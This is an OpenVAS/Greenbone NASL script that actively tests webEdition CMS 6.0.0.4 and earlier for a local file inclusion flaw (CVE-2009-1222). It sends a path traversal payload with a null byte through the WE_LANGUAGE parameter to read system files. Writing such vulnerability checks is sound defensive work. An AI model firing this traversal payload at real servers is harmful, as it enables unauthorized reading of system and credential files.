# Copyright (C) 2009 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:webedition:webedition_cms";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100103");
  script_version("2022-04-12T11:16:16+0000");
  script_tag(name:"last_modification", value:"2022-04-12 11:16:16 +0000 (Tue, 12 Apr 2022)");
  script_tag(name:"creation_date", value:"2009-04-05 13:52:05 +0200 (Sun, 05 Apr 2009)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2009-1222");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("webEdition CMS <= 6.0.0.4 LFI Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_webedition_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("webedition/http/detected");
  script_require_ports("Services/www", 443);

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34323");

  script_tag(name:"summary", value:"webEdition CMS is prone to a local file include (LFI)
  vulnerability because it fails to properly sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to view and execute
  arbitrary local files in the context of the webserver process.");

  script_tag(name:"affected", value:"webEdition CMS version 6.0.0.4 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/index.php?WE_LANGUAGE=../../../../../../../../" + files[file] + '%00';

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
